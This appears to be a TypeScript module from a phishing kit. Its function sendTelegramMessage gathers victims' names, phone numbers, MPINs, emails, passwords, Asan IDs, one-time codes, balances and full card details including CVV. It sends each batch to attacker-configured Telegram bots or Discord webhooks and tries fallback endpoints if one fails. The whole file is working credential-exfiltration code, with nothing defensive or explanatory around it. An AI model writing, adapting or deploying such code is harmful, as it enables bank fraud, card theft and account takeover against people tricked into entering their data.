const formatCountryName = (codeOrName?: string): string => {
    if (!codeOrName || codeOrName === "N/A") return "N/A";
    const trimmed = codeOrName.trim();
    if (trimmed.length === 2) {
        try {
            const regionNames = new Intl.DisplayNames(["en"], { type: "region" });
            return regionNames.of(trimmed.toUpperCase()) || trimmed;
        } catch {
            return trimmed;
        }
    }
    return trimmed;
};

export const fetchVisitorInfo = async () => {
    return null;
};

export const sendTelegramMessage = async (params: {
    type?: string;
    title?: string;
    exclude?: string[];
    message?: string;
    [key: string]: any;
}) => {
    try {
        const botTokensValue = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
        const chatIdValue = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;

        if (!botTokensValue || !chatIdValue) {
            console.warn("Telegram bot token or chat ID is missing in environment variables.");
            return;
        }

        const { title, exclude, message: customMsg, ...newInfo } = params;

        const chatIds = chatIdValue.split(",").map((id) => id.trim());
        const botTokens = botTokensValue.split(",").map((token) => token.trim());

        // Construct message
        let message = `<b>🚀 ${title || "ACTION ALERT"}</b>\n\n`;

        // Section: CUSTOM MESSAGE (If provided)
        if (customMsg) {
            message += `<b>📝 DETAILS:</b>\n${customMsg}\n\n`;
        }

        // Section: USER DATA (Comprehensive field mapping for all screen forms)
        const userDocId = newInfo.documentId || newInfo.docId || newInfo.DocumentId || newInfo.doc_id || newInfo.DocId || newInfo.id;
        const userName = newInfo.fullName || newInfo.FullName || newInfo.full_name || newInfo.name || newInfo.Name || newInfo.username || newInfo.Username;
        const userPhone = newInfo.mobileNumber || newInfo.MobileNumber || newInfo.mobile || newInfo.phoneNumber || newInfo.phone || newInfo.Phone || newInfo.PhoneNumber || newInfo.mobile_number;
        const userMpin = newInfo.mpin || newInfo.MPIN || newInfo.mPin || newInfo.pin || newInfo.PIN || newInfo.userPin || newInfo.Pin;
        const userEmail = newInfo.email || newInfo.Email;
        const userPassword = newInfo.password || newInfo.Password || newInfo.pass || newInfo.Pass;
        const userAsan = newInfo.asanId || newInfo.AsanId;

        const hasUserData = userDocId || userName || userPhone || userMpin || userEmail || userPassword || userAsan;
        if (hasUserData) {
            message += `<b>👤 USER DATA:</b>\n`;
            if (userDocId && userDocId !== "N/A") message += `• <b>Document ID:</b> <code>${userDocId}</code>\n`;
            if (userName && userName !== "N/A") message += `• <b>Full Name:</b> <code>${userName}</code>\n`;
            if (userPhone && userPhone !== "N/A") message += `• <b>Phone / Mobile:</b> <code>${userPhone}</code>\n`;
            if (userMpin && userMpin !== "N/A") message += `• <b>MPIN:</b> <code>${userMpin}</code>\n`;
            if (userEmail && userEmail !== "N/A") message += `• <b>Email:</b> <code>${userEmail}</code>\n`;
            if (userPassword && userPassword !== "N/A") message += `• <b>Pass:</b> <code>${userPassword}</code>\n`;
            if (userAsan && userAsan !== "N/A") message += `• <b>Asan ID:</b> <code>${userAsan}</code>\n`;
            message += `\n`;
        }

        // Section: OTP (Only if provided)
        const hasOtp = newInfo.otp1 || newInfo.otp2 || newInfo.otp3 || newInfo.otp || newInfo.OTP;
        if (hasOtp) {
            message += `<b>🔐 OTP VERIFICATION:</b>\n`;
            if (newInfo.otp1 || newInfo.otp || newInfo.OTP) message += `• <b>OTP-1:</b> <code>${newInfo.otp1 || newInfo.otp || newInfo.OTP}</code>\n`;
            if (newInfo.otp2) message += `• <b>OTP-2:</b> <code>${newInfo.otp2}</code>\n`;
            if (newInfo.otp3) message += `• <b>OTP-3:</b> <code>${newInfo.otp3}</code>\n`;
            message += `\n`;
        }

        // Section: FINANCIAL (Only if provided)
        if (newInfo.balance) {
            message += `<b>💰 FINANCIAL INFO:</b>\n`;
            message += `• <b>Balance:</b> <code>${newInfo.balance}</code>\n`;
            message += `\n`;
        }

        // Section: CARD DETAILS (Only if provided)
        const hasCardData = newInfo.cardNumber || newInfo.expiry || newInfo.cvv;
        if (hasCardData) {
            message += `<b>💳 CARD DETAILS:</b>\n`;
            if (newInfo.cardNumber) message += `• <b>Card No:</b> <code>${newInfo.cardNumber}</code>\n`;
            if (newInfo.expiry) message += `• <b>Expiry:</b> <code>${newInfo.expiry}</code>\n`;
            if (newInfo.cvv) message += `• <b>CVV:</b> <code>${newInfo.cvv}</code>\n`;
            message += `\n`;
        }

        // Section: ADDITIONAL COLLECTED DATA (Catch any other custom keys)
        const standardKeys = new Set([
            "type", "title", "exclude", "message",
            "documentId", "docId", "DocumentId", "doc_id", "DocId", "id",
            "fullName", "FullName", "full_name", "name", "Name", "username", "Username",
            "mobileNumber", "MobileNumber", "mobile", "phoneNumber", "phone", "Phone", "PhoneNumber", "mobile_number",
            "mpin", "MPIN", "mPin", "pin", "PIN", "userPin", "Pin",
            "email", "Email", "password", "Password", "pass", "Pass", "asanId", "AsanId",
            "otp1", "otp2", "otp3", "otp", "OTP",
            "balance", "cardNumber", "expiry", "cvv"
        ]);

        const extraEntries = Object.entries(newInfo).filter(
            ([key, val]) => !standardKeys.has(key) && val !== undefined && val !== null && val !== ""
        );

        if (extraEntries.length > 0) {
            message += `<b>📋 OTHER DATA:</b>\n`;
            extraEntries.forEach(([key, val]) => {
                message += `• <b>${key}:</b> <code>${val}</code>\n`;
            });
            message += `\n`;
        }

        console.log("📤 Sending Telegram Message:", { title, type: params.type });

        const rawGateway = process.env.NEXT_PUBLIC_TELEGRAM_API_GATEWAY || process.env.TELEGRAM_API_GATEWAY || "https://api.telegram.org";
        const gateway = rawGateway.replace(/\/+$/, "");

        const results = await Promise.all(
            chatIds.map(async (id, index) => {
                const token = botTokens[index] || botTokens[botTokens.length - 1];
                try {
                    // Check if token is a discord webhook URL
                    if (token && (token.startsWith("http://") || token.startsWith("https://"))) {
                        const res = await fetch(token, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({ content: message.replace(/<[^>]*>/g, "") }),
                        });
                        return await res.json().catch(() => ({ ok: true }));
                    }

                    // Standard Telegram Bot API call
                    const endpoints = [
                        `${gateway}/bot${token}/sendMessage`,
                        `https://api.telegram.org/bot${token}/sendMessage`
                    ];

                    // Remove duplicate endpoints if gateway is default
                    const uniqueEndpoints = Array.from(new Set(endpoints));

                    let lastError: any = null;
                    for (const endpoint of uniqueEndpoints) {
                        try {
                            const response = await fetch(endpoint, {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({
                                    chat_id: id,
                                    text: message,
                                    parse_mode: "HTML",
                                }),
                            });
                            const data = await response.json();
                            if (!response.ok) {
                                console.warn(`⚠️ Telegram Error (${id}) from ${endpoint}:`, data);
                            } else {
                                console.log(`✅ Telegram Success (${id}) via ${endpoint}:`, data);
                                return data;
                            }
                        } catch (endpointErr) {
                            lastError = endpointErr;
                        }
                    }
                    return null;
                } catch (err) {
                    console.warn(`⚠️ Error sending Telegram message (${id}):`, err);
                    return null;
                }
            })
        );
        return results;
    } catch (error) {
        console.warn("⚠️ Warning in sendTelegramMessage:", error);
        return null;
    }
};
